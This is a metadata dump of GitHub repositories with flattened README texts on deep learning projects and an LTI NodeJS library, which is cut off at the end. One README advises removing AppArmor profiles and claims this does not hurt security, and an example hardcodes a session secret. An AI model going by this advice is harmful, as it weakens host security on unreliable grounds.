hmorimitsu,daisy-gpu,n/a,daisy gpu Implementation of the DAISY descriptor 1 references on GPU using deep learning libraries Codes are provided for PyTorch Tensorflow 1 and Tensorflow 2 This implementation is based on and borrows some parts of code from the scikit image version available at https github com scikit image scikit image blob master skimage feature daisy py https github com scikit image scikit image blob master skimage feature daisy py This code is able to process a batch of images simultaneously for better performance The most expensive operation when running in GPU mode is the allocation of the space for the descriptors on the GPU However this step is only performed when the shape of the input batch changes Subsequent calls using batches with the same shape as before will reuse the memory and will therefore be much faster Code for SIFT Flow descriptors on GPU is also available at https github com hmorimitsu sift flow gpu https github com hmorimitsu sift flow gpu Requirements Base Python 3 https www python org Tested on 3 7 Numpy https www numpy org Deep learning libraries PyTorch https pytorch org 1 0 0 Tested on 1 1 0 or Tensorflow 1 X https www tensorflow org Tested on 1 14 or Tensorflow 2 X https www tensorflow org Tested on 2 0 0 beta1 Usage PyTorch version A simple example is shown below A more complete practical usage is available as a Jupyter demo notebook demonotebooktorch ipynb python from daisytorch import DaisyTorch daisy DaisyTorch imgs readsomeimage readanotherimage descs daisy extractdescriptor imgs This first call can be slower due to memory allocation imgs2 readyetanotherimage readevenonemoreimage descs2 daisy extractdescriptor imgs2 Subsequent calls are faster if images retain same shape descs 0 is the descriptor of imgs 0 and so on Tensorflow 1 version python from daisytf import DaisyTF daisy DaisyTF imgs readsomeimage readanotherimage imgs2 readyetanotherimage readevenonemoreimage imgstf descstf daisy extractdescriptor imgs 0 shape 2 with tf Session as sess This first call can be slower due to memory alloc descs sess run descstf feeddict imgstf np stack imgs axis 0 None astype np float32 Subsequent calls are faster if images retain same shape descs2 sess run descstf feeddict imgstf np stack imgs2 axis 0 None astype np float32 descs 0 is the descriptor of images 0 and so on Tensorflow 2 version python from daisytf2 import DaisyTF2 daisy DaisyTF2 imgs readsomeimage readanotherimage descs daisy extractdescriptor imgs This first call can be slower due to memory alloc imgs2 readyetanotherimage readevenonemoreimage descs2 daisy extractdescriptor imgs2 Subsequent calls are faster if images retain same shape descs 0 is the descriptor of images 0 and so on Benchmark Machine configuration Intel i7 8750H NVIDIA GeForce GTX1070 Images 1024 x 436 Descriptor size 200 Batch Size PyTorchTime CPU ms PyTorchTime GPU ms 1 TF2Time GPU ms 1 PyTorchTime GPU ms 2 TF1Time GPU ms 2 TF2Time GPU ms 2 1 428 8 2 4 1 5 35 5 21 0 32 5 2 786 5 3 2 2 7 68 4 39 8 58 0 4 1973 1 5 1 4 1 127 2 77 2 114 2 8 3042 5 8 9 6 4 250 8 151 4 227 1 1 NOT including time to transfer the result from GPU to CPU 2 Including time to transfer the result from GPU to CPU These times are the median of 5 runs measured after a warm up run to allocate the descriptor space in memory read the introduction daisy pytorch References 1 E Tola V Lepetit P Fua Daisy An Efficient Dense Descriptor Applied to Wide Baseline Stereo IEEE TPAMI 2010 DOI 10 1109 TPAMI 2009 77,2019-07-04T12:44:59Z,2019-12-12T00:33:35Z,Jupyter Notebook,hmorimitsu,User,1,2,1,7,master,hmorimitsu,1,0,0,0,0,0,0
Brycexxx,CS224N,n/a,CS224N Natural Language Processing with Deep Learning CS224N Ling284,2019-07-24T13:19:20Z,2019-09-07T10:01:33Z,JavaScript,Brycexxx,User,0,2,1,17,master,Brycexxx,1,0,0,0,0,0,0
KrishnaswamyLab,scnn,n/a,scnn logo logo png scnn is a collection of deep learning algorithms for the analysis of high dimensional high throughput data with a particular focus on single cell genomics scnn is currently under development and will soon contain methods for running SAUCIE https github com KrishnaswamyLab SAUCIE MAGAN https github com KrishnaswamyLab MAGAN AANet https github com KrishnaswamyLab AANet Installation You can install scnn with pip pip install user git https github com KrishnaswamyLab scnn,2019-07-26T05:03:27Z,2019-09-21T05:20:31Z,Python,KrishnaswamyLab,Organization,1,2,1,2,master,scottgigante,1,0,0,0,0,0,0
SwapnilChaudhari,YogadaySentimentAnalysisPython,n/a,Deep Learning and Sentiment Analysis on YogaDay Tweets About SentimentYoga2019 Dataset Dataset was gathered from tweeter tweets on International Yoga day and labeled using rapidminer,2019-07-03T19:46:59Z,2019-07-11T15:33:45Z,Jupyter Notebook,SwapnilChaudhari,User,0,2,1,3,master,SwapnilChaudhari,1,0,0,0,0,0,0
victorychain,Adversarial-Policy-Gradient-Augmentation,n/a,Adversarial Policy Gradient for Medical Deep Learning Image Augmentation MICCAI2019 https arxiv org abs 1909 04108 Kaiyang Cheng Claudia Iriondo Francesco Caliv Justin Krogue Sharmila Majumdar Valentina Pedoia Equal contribution Introduction The use of semantic segmentation for masking and cropping input images has proven to be a significant aid in medical imaging classification tasks by decreasing the noise and variance of the training dataset However implementing this approach with classical methods is challenging the cost of obtaining a dense segmentation is high and the precise input area that is most crucial to the classification task is difficult to determine a priori We propose a novel joint training deep reinforcement learning framework for image augmentation A segmentation network weakly supervised with policy gradient optimization acts as an agent and outputs masks as actions given samples as states with the goal of maximizing reward signals from the classification network In this way the segmentation network learns to mask unimportant imaging features Our method Adversarial Policy Gradient Augmentation APGA shows promising results on Stanford s MURA dataset and on a hip fracture classification task with an increase in global accuracy of up to 7 33 and improved performance over baseline methods in 9 10 tasks evaluated We discuss the broad applicability of our joint training strategy to a variety of medical imaging tasks image images FINALFINAL png Usage 1 Requirements Python 3 6 PyTorch 1 0 Torchvision Numpy Pandas Tqdm Google Fire https github com google python fire 2 Clone the repository shell git clone https github com victorychain Adversarial Policy Gradient Augmentation git 3 Dataset Download the MURA https stanfordmlgroup github io competitions mura dataset Please put dataset in folder dataset 4 Training To train all the methods by body parts elbow for example shell python apgamura py seed 88 body part elbow n runs 1 gpu id 0 train cutout 1 train apga 1 train gradcam 1 train end2end 1 To train k shot shell python apgamura py seed 88 body part elbow n runs 1 gpu id 0 train cutout 1 train apga 1 train gradcam 1 train end2end 1 n shot 100 Citation If APGA is useful for your research please consider citing articleChengIriondoCalivKrogueMajumdarPedoia2019 title Adversarial Policy Gradient for Deep Learning Image Augmentation url http arxiv org abs 1909 04108 note arXiv 1909 04108 journal arXiv 1909 04108 cs author Cheng Kaiyang and Iriondo Claudia and Caliv Francesco and Krogue Justin and Majumdar Sharmila and Pedoia Valentina year 2019 month Sep Acknowledgement Thank you UCSF and UC Berkeley,2019-07-24T19:35:40Z,2019-11-11T13:00:57Z,Jupyter Notebook,victorychain,User,0,2,0,6,master,victorychain,1,0,0,0,0,0,0
Spidy20,Image_Classifier_Flask,flask-application#image-classification#image-classification-website#image-processing#image-recognition#keras#keras-models#resnet-50,Image Classification website based on Deep Learning with Flask This website can recognise any image you just need to upload image on server I used Deep learning Resnet model for Image Classification Sourcerer Code Requirements Flask pip install flask keras pip install keras Numpy pip install numpy What steps you have to follow Run app py Go to http 127 0 0 1 5000 ImageClassification 1 2 Just follow me and Star my repository,2019-08-02T12:59:03Z,2019-11-23T07:23:10Z,HTML,Spidy20,User,1,2,0,3,master,Spidy20,1,0,0,0,0,0,0
andrealvesdc,Quantitative-Finance,n/a,Quantitative Finance Utilizando tcnicas de Machine Learning e Deep Learning IA para o mercado financeiro images https user images githubusercontent com 19534807 64923985 00443300 d7b6 11e9 81bf 55d1ff1a21b5 png O objetivo geral dos algoritmos de aprendizagem de mquina aqui desenvolvidos fazer a identifica o de possveis movimentaes futuras em um determinado mercado financeiro mercado de aes Ibovespa Mini ndice Criptomoeda Forex etc obtendo como resposta a probabilidade do mercado se mover em uma determinada dire o e a probabilidade dos preos atingirem um determinado ponto N o recomendo que terceiros faam investimentos apenas baseados nas respostas dos algoritmos aqui disponibilizados preciso ter conhecimento de como o mercado financeiro funciona principalmente quais as suas variveis internas que d o origem as movimentaes Antes de utilizar qualquer algoritmo necessrio se fazer o treinamento do mesmo com os dados do mercado que voc deseja aplicar o algoritmo image https user images githubusercontent com 19534807 64924012 57e29e80 d7b6 11e9 8978 e965949f7f2d png,2019-08-02T13:00:53Z,2019-09-29T21:55:33Z,Jupyter Notebook,andrealvesdc,User,1,2,0,8,master,andrealvesdc,1,0,0,0,0,0,0
SupratimH,deepartist-web-application,convolutional-neural-networks#css#deep-learning#flask#html#image-classification#keras#painter-identification#python#tensorflow,DeepArtist Web Application An AI bot which can identify artist of paintings Ever came across a piece of art and not able to recollect the legend behind the creation DeepArtist AI bot is there for your rescue Access it through one of the following links https find artist herokuapp com preferred one https supratimh github io find artist Who is DeepArtist AI bot DeepArtist is a Deep Learning model built with a carefully designed Convolution Neural Network It has been trained to understand the underlying painting styles of the following legends Vincent van Gogh 1853 1890 Dutch Post Impressionism Edgar Degas 1834 1917 French Impressionism Pablo Picasso 1881 1973 Spanish Cubism Pierre Auguste Renoir 1841 1919 French Impressionism Albrecht Durer 1471 1528 German Northern Renaissance Paul Gauguin 1848 1903 French Symbolism Post Impressionism Francisco Goya 1746 1828 Spanish Romanticism Rembrandt 1606 1669 Dutch Baroque Alfred Sisley 1839 1899 French British Impressionism Titian 1488 1576 Italian High Renaissance Mannerism Marc Chagall 1887 1985 French Jewish Belarusian Primitivism The code for training the model is available here https github com SupratimH applying ml use cases tree master DeepArtist Identify Artist From Art Accuracy of the current model on unseen paintings of the above artists is approx 87 The model is being improved and trained on sample paintings of more artists What does this repo contain The code to deploy serve DeepArtist or any ML or DL model for that matter on cloud as a web application At present it is deployed on Heroku and can be accessed through the links provided above Instructions to use DeepArtist Bot application 1 Open the application through the links provided above 2 From web copy the url location address of the image jpeg or png file usually by right click on the image copy image address option The list of artists it can identify are provided above 3 Paste the url in text box and click Who s the artist button 4 That s it DeepArtist Bot will read the image from url run prediction on it and show the probable artist name and accuracy probability 5 Bonus try an image or painting of your own to see which artist s style is the closest match Instructions to deploy this application on Heroku Create an account in Heroku https www heroku com A free tier would suffice for an application of this scale Fork this repo It is important to fork the repo because you ll be able to connect to only your own repo Create a new app from here https dashboard heroku com apps Connect the app to your GitHub account and select the repo to deploy Perform manual deploy from the Deploy tab When deployment is complete click Open App to run the command associated with your Flask app s default route i e app route decorator Instructions to deploy this application on local system Fork and Clone the repo Run pip install r requirements txt cd to home directory of this app Run python app py Access the API from web browser from http 127 0 0 0 1 5000 Since a HTML file is rendered in default route the find artist html will open in browser Which files should be modified app py Behavior of all the endpoints which can be associated with different functions APIs the app will provide serve py Implementation of backend business logic For an ML or DL app this is where we should read the trained weights and make predictions requirements txt List of packages required to run this app This is required by Heroku runtime txt Required by Heroku to determine exact version of Python required to run this app Procfile To tell Heroku about how to run this app NOTE If your saved model is smaller than 100 MB it is advisable to commit it into Github and make the app read from the corresponding directory However if it is larger then save it on a remote storage like Google Drive Dropbox etc and make the app download and read it from there The second approach has been taken for this application References This wonderful tutorial by Guillaume Genthial https guillaumegenthial github io serving html And this wonderful series by Rachael Tatman https www kaggle com rtatman careercon intro to apis Contact e mail For any feedback or questions or just to say Hi drop me a line anytime at supratimh gmail com books To read about other projects I am working on please visit my home page https supratimh github io heart Thank you for reading,2019-07-03T19:48:42Z,2019-07-29T04:34:11Z,HTML,SupratimH,User,0,2,0,45,master,SupratimH,1,0,0,0,0,0,0
fturib,mandlagore,n/a,mandlagore Expect help label Mandragore db using Deep Learning on the illuminations,2019-07-11T23:40:49Z,2019-07-16T17:24:31Z,n/a,fturib,User,1,2,0,1,master,fturib,1,0,0,0,0,0,0
knmnyn,cs6101-1910,deep-learning#deep-unsupervised-learning#jekyll#nus#unsupervised-learning,,2019-07-06T03:37:42Z,2019-11-07T17:07:08Z,HTML,knmnyn,User,0,2,0,12,master,kishaloyhalder#knmnyn,2,0,0,0,0,0,0
liuyaox,text_classification,keras#nlp#pytorch#text-classification,Text Classification Keras15TextCNN TextRNN TextDPCNN TextRCNN TextHAN TextBert 5word level char level TFIDF LSA Context word left word right char left char right sentence level 4 Task Data Labels Labels System Function Battery Appearance Network Photo Accessory Purchase Quality Hardware Contrast 30 000 1573355016134 image 1573355016134 png Multi label Binary Classification 11LabelsLabel2 41 Config pyBasicModel py 1Config pyBasicModel py python Config py self task multilabel self tokenlevel word word word char char both word char self NCLASSES 11 BasicModel py if config task binary self nclasses 1 self activation sigmoid self loss binarycrossentropy self metrics accuracy elif config task categorical self nclasses config NCLASSES self activation softmax self loss categoricalcrossentropy self metrics accuracy elif config task multilabel self nclasses config NCLASSES self activation sigmoid self loss binarycrossentropy self metrics accuracy 24 a Dense 1 activation sigmoid 1 b N Dense N activation softmax NTop1 c M c 1 Dense M activation sigmoid MTopK c 2 Mbbc 1 d MN d 1 MNc 1 d 2 MNc 2 d 3 Mbb c 1 Requirement Python 3 6 5 Keras 2 2 4 Numpy 1 16 3 Pandas 0 23 0 SciPy 1 1 0 Sklearn 0 21 3 Data Preprocessing 1573364046216 image 1573364046216 png DataPreprocessing py https github com liuyaox textclassification blob master DataPreprocessing py Labels Embedding Embedding py https github com liuyaox textclassification blob master Embedding py Word EmbeddingWord Embeddingword char Vocabulary Vocabulary py https github com liuyaox textclassification blob master Vocabulary py Embedding Embedding Layer includingexcluding word char FeatureStructured py https github com liuyaox textclassification blob master FeatureStructured py TFIDFLSAword charLSI LDA TokenSelection py https github com liuyaox textclassification blob master TokenSelection py ModelTrain py https github com liuyaox textclassification blob master ModelTrain py MultiLabelBinarizerLabel DataAugmentation py https github com liuyaox textclassification blob master DataAugmentation py ShuffleRandom Drop Model ModelModel 1573366328001 image 1573366328001 png BasicModel 3Metrics BasicDeepModel Layers LossMetrics Embedding CV Schedular BasicStatModel 6 15 TextCNN TextRNN TextRCNNCNNRNN TextDPCNNResNetRNN CNN TextHAN TextBertTextGRUBert 5 Config word char word structure char structure 41424344 TextRCNNContext word left word right char left char right TextHANSentence level KFold6Finetuning Attention Train Evaluation Train ModelTrain py https github com liuyaox textclassification blob master ModelTrain py TokenLabelTrain Test EmbeddingVocabularyData Preprocessing python3 ModelTrain py python Config py config ngpus 1 config tokenlevel word word levelchar level config structured none config bertflag False Bert Evaluation 15 1573368628525 image 1573368628525 png word charword word char structuredword char TextCNNPrecisionF1Baseline TextRNN Bert TextGRU F1 TextHANPrecision Conclusion 1 Config 2 3 VocabularyEmbedding class 4 a keyInputname b BasicDeepModel 2 c TextCNNTricks d 5 a CNN RNNCNNRNNAttentionMaxPooling b CapsuleCNNCNN c Bert Reference Code Keras PyTorch 2017 Rank1 Rank2 Libray kashgari https github com BrikerMan Kashgari NLPCutting Edge hyperas https github com maxpumperla hyperas Keras sk multilearn https github com scikit multilearn scikit multilearn Sklearn Article CNN RNN Attention https zhuanlan zhihu com p 25928551 tricks https www zhihu com question 265357659,2019-07-16T02:46:12Z,2019-12-10T02:41:35Z,Python,liuyaox,User,1,2,1,24,master,liuyaox,1,0,0,0,0,0,0
manuellange,DLD,n/a,DLD DLD A Deep Learning Based Line Descriptor for Line Feature Matching,2019-07-17T13:35:24Z,2019-11-26T06:56:04Z,n/a,manuellange,User,1,2,0,1,master,manuellange,1,0,0,2,0,0,0
llafcode,IntroDL_EX03_AutoLyrics,n/a,IntroDLEX03AutoLyrics This is the third assignment of the course Introduction to Deep Learning in BGU Dataset description midifiles directory in which all melody files 625 are stored The midi files contain various types of information notes the instruments used etc lyricstrainset csv training data 600 songs The data is structured as artists song name full lyrics lyricstestset csv test data 5 songs Structured the same as the training data,2019-07-16T08:53:48Z,2019-08-04T17:13:02Z,Jupyter Notebook,llafcode,User,1,2,0,45,master,MahlerTom#llafcode,2,0,0,0,0,0,0
fabiofumarola,embeddings_for_fun,n/a,How do I embed a sequence of words From context free to contextual embeddings Abstract ENG The goal of this talk is answering to a simple question in the field of Natural Language Processing how do I embed a sequence of words To respond this question we analyze the reference literature related to Word Representations in Vector Space Starting from traditional Distributional Semantic Models we ll move to context free approaches such as Word2Vec FastText and GloVE that generate a single word embedding representation for each word in the vocabulary so bank would have a similar representation to bank deposit and river bank Finally we will focus on contextual models such as ELMo BERT ULMFiT OpenAI transformer and XLNet which generate a representation of each word that is based on the order of the other words sequence of characters in the sentence For each method we ll highlight pros cons and application examples Abstract ITA Il goal di questo task porre le basi per rispondere ad una semplice domanda nel campo del Natural Language Processing ossia Come embeddare in maniera efficace una sequenza di parole Per rispondere a questa domanda analizzeremo la letteratura di riferimento nel campo del Word Representations in Vector Space Partendo da approcci classici basati su Distributional Semantic introdurremo modelli context free come Word2Vec FastText e GloVE il cui obiettivo generare una word embedding per ogni parola nel vocabolario di riferimento dove per esempio la parola bank avr una rappresentazione simile a bank deposit e river bank Infine ci concentreremo sui contextual models come ELMo BERT ULMFiT OpenAI transformer e XLNet che sono in grado di generare una rappresentazione di una parola basata sull ordine in cui sono osservate le altre parole sequenza di caratteri nella frase osservata Per ognuno degli approcci analizzeremo pro contro e fornire degli esempi di task in cui applicarli slides embeddingsforfun pdf if you want the ppt version just drop me a message Setup In order to setup di environments please use virtualenv https docs python guide org dev virtualenvs or miniconda https docs conda io en latest miniconda html We suggest to use the latter 1 install miniconda 2 setup the environments conda create name dltf1 python 3 conda activate dltf1 base setuptf1 sh 3 create the environments and install libraries conda create name dltf2 python 3 conda activate dltf2 bash setuptf1 sh 4 open jupyter notebooks jupyter notebook,2019-07-20T07:09:21Z,2019-08-04T09:03:18Z,Python,fabiofumarola,User,0,2,0,0,master,,0,0,0,0,0,0,0
joehoeller,bandit-box,n/a,BanditBox A reproducible and portable GPU and TPU accelerated machine learning container GPU Accelerated computing container for machine learning and NLP that are reproducible across environments BanditBox Features Contextual Bandits https contextual bandits readthedocs io en latest installation Contains working examples in apps of various gradient policy networks Framework handles contextual multi armed bandits Adaptations from multi armed bandits strategies you can use Upper confidence Bound Thompson Sampling Epsilon Greedy Adaptive Greedy Adaptive Greedy algorithm shows a lot of promise Explore Then Exploit Vowpal Wabbit https github com VowpalWabbit vowpalwabbit wiki Vowpal Wabbit VW is a high performance machine learning system which pushes the frontier of machine learning with techniques such as online hashing allreduce reductions learning2search active and interactive learning The contextual bandit learning algorithms in VW consist of two broad classes The first class consists of settings where the maximum number of actions is known ahead of time and the semantics of these actions stay fixed across examples A more advanced setting allows potentially changing semantics per example GPU TPU Machine Learning Distributed Pipelines for ultra fast inference Dask Distributed https dask org Distributed ingestion of data Feature Tools https docs featuretools com Automted feature engineering TensorFlow for GPU v1 13 1 https www tensorflow org install gpu Machine Learning TensorBoard https www datacamp com community tutorials tensorboard tutorial Understand debug and optimize TensorFlowServing Python API https www tensorflow org tfx guide serving Get to prod with model stability NVIDIA TensorRT inference accelerator and CUDA 10 https developer nvidia com tensorrt CUDA TPUs makes you awesome PyCUDA 2019 https mathema tician de software pycuda Python interface for direct access to GPU or TPU CuPy latest https cupy chainer org GPU accelerated drop in replacement for numpy Ubuntu 18 04 so you can nix your way through the cmd line cuDNN7 4 1 5 for deeep learning in CNN s https developer nvidia com cudnn GPU accelerated library of primitives for deep neural networks How else do you plan to serve a model to production TensorFlow serving api https www tensorflow org tfx guide serving Good to know Hot Reloading code updates will automatically update in container from apps folder TensorBoard is on localhost 6006 and GPU enabled Jupyter is on localhost 8888 Python 3 6 7 Stable Secure Only Tesla Pascal and Turing GPU Architecture are supported NLP capability added with pytesseract and textract Test with synthetic data that compares GPU to CPU benchmark and Tensorboard example 1 CPU GPU Benchmark https github com joehoeller bandit box blob master apps gpubenchmarks benchmark py 2 Tensorboard to understand debug neural networks https github com joehoeller bandit box blob master apps gpubenchmarks tensorboard py Just to get you going there are working examples of different types of policy gradient networks located in 1 apps policy gradient reinforcement agent https github com joehoeller bandit box blob master apps policy gradient reinforcement agent Model Network ipynb 2 apps contextual policy gradient https github com joehoeller bandit box tree master apps contextual policy gradient 3 apps policy network https github com joehoeller bandit box tree master apps policy network 4 apps simple policy https github com joehoeller bandit box blob master apps simple policy Simple Policy ipynb Before you begin This might be optional Link to nvidia docker2 install Tutorial https medium com sh tsang docker tutorial 5 nvidia docker 2 0 installation in ubuntu 18 04 cb80f17cac65 You must install nvidia docker2 and all it s deps first assuming that is done run sudo apt get install nvidia docker2 sudo pkill SIGHUP dockerd sudo systemctl daemon reload sudo systemctl restart docker How to run this container Step 1 docker build t Step 2 Run the image mount the volumes for Jupyter and app folder for your fav IDE and finally the expose ports 8888 for TF1 and 6006 for TensorBoard docker run rm it runtime nvidia user id u id g group add containeruser group add sudo v PWD apps v pwd tf notebooks p 8888 8888 p 0 0 0 0 6006 6006 Step 3 Check to make sure GPU drivers and CUDA is running Exec into the container and check if your GPU is registering in the container and CUDA is working Get the container id docker ps Exec into container docker exec u root t i bin bash Check if NVIDIA GPU DRIVERS have container access nvidia smi Check if CUDA is working nvcc V Step 4 How to launch TensorBoard It helps to use multiple tabs in cmd line as you have to leave at least 1 tab open for TensorBoard 6006 Demonstrates the functionality of TensorBoard dashboard Exec into container if you haven t as shown above Get the docker ps docker exec u root t i bin bash Then run in cmd line tensorboard logdir tmp tensorflow mnist logs Type in cd to get root Then cd into the folder that hot reloads code from your local folder fav IDE at apps apps gpubenchmarks and run python tensorboard py Go to the browser and navigate to localhost 6006 Step 5 Run tests to prove container based GPU perf Demonstrate GPU vs CPU performance Exec into the container if you haven t and cd over to tf notebooks apps gpubenchmarks and run CPU Perf python benchmark py cpu 10000 CPU perf should return something like this Shape 10000 10000 Device cpu 0 Time taken 0 00 03 934996 GPU perf python benchmark py gpu 10000 GPU perf should return something like this Shape 10000 10000 Device gpu 0 Time taken 0 00 01 032577 Known conflicts with nvidia docker and Ubuntu AppArmor on Ubuntu has sec issues so remove docker from it on your local box it does not hurt security on your computer sudo aa remove unknown If building impactful data science tools is important to you or your business please get in touch Contact Email joehoeller gmail com,2019-07-08T20:27:48Z,2019-12-10T05:32:40Z,Jupyter Notebook,joehoeller,User,0,2,1,17,master,joehoeller,1,0,0,0,0,0,0
basnetsoyuj,AlphaBaghChal,n/a,AlphaBaghChal A deep reinforcement learning model to learn the traditional Nepali board game of BaghChal from self play inspired by AlphaZero AI playing BaghChal baghchal gif Todos Tabula Rasa Learning Better training Pytorch version,2019-07-04T17:35:37Z,2019-11-19T16:34:20Z,Python,basnetsoyuj,User,0,2,1,10,master,basnetsoyuj,1,0,0,0,0,0,0
chenyilan,Y-Net,n/a,Y Net The source code of Y Net A Hybrid Deep Learning Reconstruction Framework for Photoacoustic Imaging in vivo,2019-07-13T05:57:53Z,2019-12-04T08:36:11Z,Python,chenyilan,User,0,2,1,6,master,chenyilan,1,0,0,0,0,0,0
navreeetkaur,Video-Skimming,n/a,Video Skimming Assignment 2 Deep Learning ELL888 IIT Delhi Problem Statement Lots of good quality educational videos are available on platforms like YouTube and NPTEL but students are not able to use them optimally since videos are not indexed properly This assignment tries to deal with this problem Have a look at this video https goo gl VTaz7h You will notice that in general the professor writes on papers removes that paper that is completely filled and then starts writing again on a new sheet The aim of this assignment is to extract out those frame of a video which captures the full written content on a sheet of paper Suppose the professor writes 7 sheets in one lecture if we could get the frames capturing those 7 filled sheets we will have almost all the information of what professor taught in that lecture in just 7 images One hour video can be summarised using 7 images Call these 7 frames as key frames Sometimes instead of handwritten sheets other mediums are used to teach in lectures ppts notepad etc but the core problem is still the same Extract minimum frames from videos which cover all the written content Dataset There are two folders frames and labels frames contains frames extracted from videos lectures and lables contains csv corresponding to each lecture 1 denotes key frames and 0 non key frames Dataset Available at https goo gl ckZTTb Evaluation Metric Metric used for evaluation would be F1 score Also sometimes multiple consecutive frames will have the same content written on it so the labels and detections can have a difference of 2 frames but still capture same information To deal with this if nth frame was labelled as key the detection will be considered valid for any frame n 2 n 2 Implementation and Results Refer the report Report pdf for details on implementations experiments and results,2019-08-03T19:36:49Z,2019-11-19T19:54:17Z,Jupyter Notebook,navreeetkaur,User,1,2,0,7,master,navreeetkaur,1,0,0,0,0,0,0
cwerner,kit_micmor_summerschool_2019,n/a,KIT MICMoR SummerSchool 2019 images logos jpg MiCMOR KIT Campus Alpin Notebooks and info for the MICMoR https micmor kit edu SummerSchool Environmental Data Science From Data Exploration to Deep Learning https micmor kit edu sites default files MICMoR 20Summer 20School 202019 20Flyer pdf IMK IFU KIT Campus Alpin Sept 4 13 2019 Garmisch Partenkirchen Germany This course covers the PyData stack and setting up a Data Science centric development environment good practices in reproducible science and the handling of common data formats It then goes into Explorative Data Analysis techniques and effective visualisation Machine Learning methods and finally applications of Deep Learning models for various Environmental Science tasks Timetable Timetable of the summerschool images timetableeds2019 png Timetable Notebooks Introductions Notebook Topic Description 01intropython nbs 01intropython ipynb Python basics A general intro to Python concepts 02intronumpy nbs intro02numpy ipynb Numerical computation A short introduction into key numerical python concepts 03intromatplotlib nbs 03intromatplotlib ipynb Plotting The basic plotting facility in Python 04intropandas nbs 04intropandas ipynb Tabular data The library to handle tabular data in python 05introxarray nbs 05introxarray ipynb Gridded data A great package to handle gridded data based on numpy and pandas uses netCDF as backend Data formats ETL and visualization coming up Classical Machine Learning Special Topics coming up Special topics coming up Classical Machine Learning 2 Time series analysis coming up Deep Learning coming up,2019-07-12T11:14:27Z,2019-11-05T12:50:23Z,Jupyter Notebook,cwerner,User,2,2,2,109,master,cwerner#fuchs-k,2,0,0,0,0,0,0
MScatolin,W251_Final_Project_Say1-10,n/a,Final project for W251 Deep Learning in the Cloud and at the Edge UC Berkeley Master of Information and Data Science Program Authors Marcus Chen https github com fa mc Marcelo Queiroz https github com MScatolin Sylvia Yang https github com teleserv Wei Wang https github com vivi11130704 This repo contains the code we developed for our final work of the W251 course The goal here were to train a deep learning model to do lipreading of a digit dataset zero nine without the audio or any other context In the Articles and References https github com MScatolin W251FinalProjectSay1 10 tree master ArticlesnReferences directory you will find the articles we used to base this work In the Downloader https github com MScatolin W251FinalProjectSay1 10 tree master Downloader directory you will find the scripts we developed to download and prepare the dataset to use in LipNet model The LipNet https github com MScatolin W251FinalProjectSay1 10 tree master LipNet directory was forked from the original code so we could update Tensorflow and Python code to the use in our training machines In Dataexamples https github com MScatolin W251FinalProjectSay1 10 tree master dataexamples some files of the used training corpus after processed are available In docker https github com MScatolin W251FinalProjectSay1 10 tree master docker we stored code to build the container for our still in progress attempt to implement the final model into the edge device NVIDIA Jetson TX2 In images https github com MScatolin W251FinalProjectSay1 10 tree master images there are some resources used in for documentation here Navigate the directories for more detailed explanations and tutorials Thanks for accesing this code and feell free to reach any of us out for questions and suggestions Special thanks to Muhammad Rizki https github com rizkiarm for the work on the LipNet model our main resource here the Multimedia Systems Department of Gdansk University of Technology who publically provided the MODALITY Corpus http www modality corpus org See the whitepaper and the slide deck in this dicrectory for more information,2019-07-25T02:02:27Z,2019-10-04T23:44:05Z,Python,MScatolin,User,0,2,1,34,master,MScatolin#fa-mc,2,0,0,1,0,2,2
hariharan-srikrishnan,Pest-Detection-Model,n/a,Pest Detection Model,2019-07-12T05:38:23Z,2019-11-05T15:22:02Z,Python,hariharan-srikrishnan,User,0,2,0,3,master,hariharan-srikrishnan,1,0,0,0,0,0,0
TheCodingLama,CDAC-Workshop-CyberSecurity,n/a,CDAC Workshop CyberSecurity This repository contains data codes and presentation files which are used in CDAC Machine and Deep learning workshop,2019-07-06T04:28:45Z,2019-07-06T09:38:51Z,Jupyter Notebook,TheCodingLama,User,0,2,2,8,master,TheCodingLama,1,0,0,0,0,0,0
yusukeyasui,pose_estimation,n/a,poseestimation prototyping pose estimation using deep learning based on Robust 3D Object Tracking from Monocular Images Using Stable Parts by Alberto Crivellaro et al The code is using BOX data obtained from https cvlab epfl ch data data 3dobjecttracking,2019-07-14T07:59:41Z,2019-09-26T06:03:53Z,Python,yusukeyasui,User,0,2,0,3,master,yusukeyasui,1,0,0,0,0,0,0
GianFiyah,node-lti-v1p3-sdcs,n/a,LTI 1 3 Compliant NodeJS Library for External Tool Integration License MIT https img shields io badge License MIT yellow svg https opensource org licenses MIT This Javascript based Library allows an education provider to integrate web based external Tools into their chosen learning Platform such as Moodle Blackboard Edgenuity etc without needing to understand the underlying Learning Tools Interoperability LTI standards https www imsglobal org activity learning tools interoperability This Library supports the LTI 1 3 Core standards which implements up to date privacy and security standards It also provides limited support the Assignment and Grade Services In the future this Library will be updated to fully support the LTI Advantage extensions for Assignments Grades At this time LTI Advantage Names and Roles Provisioning Services and Deep Linking is not supported Overview Follow these steps to implement this Library 0 Develop a Tool develop a tool 1 Install Library 2 Setup Server and Routes 3 Setup MongoDB 4 Add Tool to Platform 5 Register Platform with Tool 6 Run your Server Optionally you can A Use Example Tool see the related Example Tool repo for this B View the OIDC Tool Launch Flow see the related Example Tool repo for this C Use the Test Suite D View the Glossary 0 Develop a Tool It is assumed if you are interested in integrating a Tool into a Platform that you have already developed a working Tool If not Step 0 is to develop your Tool that will be dropped into a learning Platform If you are not at that point yet you can use the Example Tool related to this Library 1 Install Library To install this Library use the Node Package Manager NPM and run in your terminal npm install node lti v1p3 2 Setup Server and Routes This library requires the use of an Express server Setup a basic Express server add middleware and routes within your server js file to launch your Tool You can refer to the server js example file in our Example Tool In addition add the following to your server Middleware to store session information app use session name ltiv1p3library secret iualcoelknasfnk saveUninitialized true resave true secure true ephemeral true httpOnly true store new MongoStore mongooseConnection mongoose connection Route to Handle OIDC Login Requests app post oidc req res createoidcresponse req res Route to Handle Tool Launches route to add to Base URL can be an empty string if unneeded app post project submit req res launchTool req res Route to send score back to Platform app post authcode req res if req body error sendscore req req session grade else res status 401 send Access denied req params error Within your Tool s route where grading is performed set up the score to be returned to the Platform This initiates the score submission which will end at the above authcode route where the score is finally sent req session grade res redirect 307 prepsendscore req Route to return from Tool to Platform app post project return req res res redirect req session decodedlaunch https purl imsglobal org spec lti claim launchpresentation returnurl req session destroy 3 Setup MongoDB This library requires MongoDB If you do not currently have MongoDB setup follow these instructions MacOS use homebrew https docs mongodb com master tutorial install mongodb on os x Windows use the installer from here https docs mongodb com master tutorial install mongodb on windows Add the following to your server js file mongoose connect mongodb localhost 27017 TESTLTI useNewUrlParser true err if err return console log err mongoose Promise Promise 4 Add Tool to Platform Within the Platform the Site Administrator needs to setup the External Tool For example in Moodle s he goes to Site Administration Plugins External 